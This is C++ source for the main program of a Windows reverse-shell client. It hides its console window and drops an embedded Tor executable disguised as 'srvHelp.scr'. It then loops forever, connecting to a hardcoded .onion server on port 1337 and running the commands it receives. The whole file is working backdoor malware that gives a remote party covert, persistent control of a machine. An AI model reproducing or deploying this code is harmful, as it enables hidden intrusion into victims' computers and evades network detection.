#include "clientClass.h"
#include "torExeRes.h"

#include <Windows.h>
#include <lmcons.h>
#include <string>
#include <fstream>

HMODULE GetCurrentModule() {
    HMODULE hModule = NULL;
    GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCTSTR)GetCurrentModule, &hModule);
    return hModule;
}

void writeResToDisk(std::string path, int r, int t){
    HMODULE hCurrentModule = GetCurrentModule();
    HRSRC hRes = FindResource(hCurrentModule, MAKEINTRESOURCE(r), MAKEINTRESOURCE(t));
    HGLOBAL hData = LoadResource(hCurrentModule, hRes);
    DWORD hDataSize = SizeofResource(hCurrentModule, hRes);
    char* hDataCharP = (char*)LockResource(hData);
    // Write to disk at path
    std::ofstream f(path, std::ios::binary);
    f.write(hDataCharP, hDataSize);
    f.close();
}

#define torExePath ".\\srvHelp.scr"

/*
    Drops tor.exe along with geoip data
*/
void dropTor() {
    writeResToDisk(torExePath, TOREXE, EXEFILE);
    CreateDirectory(L".\\data", NULL);
    writeResToDisk("data\\geoip", GEOIP, TEXTFILE);
    writeResToDisk("data\\geoip6", GEOIP6, TEXTFILE);
}

#define HOST "lj3d2pro3db5wkrz7i3byeculryh4ykqvpnc7z6xfjiv7mwmi2is5yad.onion"
#define showConsole false

int main() {
    ShowWindow(GetConsoleWindow(), (showConsole) ? SW_SHOW : SW_HIDE);

    // Put TOR onto the disk if it isnt there already
    if (GetFileAttributes((LPCWSTR)torExePath) == INVALID_FILE_ATTRIBUTES || GetFileAttributes(L"data\\geoip") == INVALID_FILE_ATTRIBUTES){
        dropTor();
    }
    
    // Hell loop of forever restarting TOR and trying to connect to the server :)
    // I could make it not restart TOR every time, but I had a few problems with that before
    while (1) {
        torRevShellClient c(torExePath, HOST, 1337);
        c.startProxy();
        c.attemptConnect();
        c.cmdProcessLoop(); // If attemptConnect() fails, this function will return immediately
    }

    return 0;
}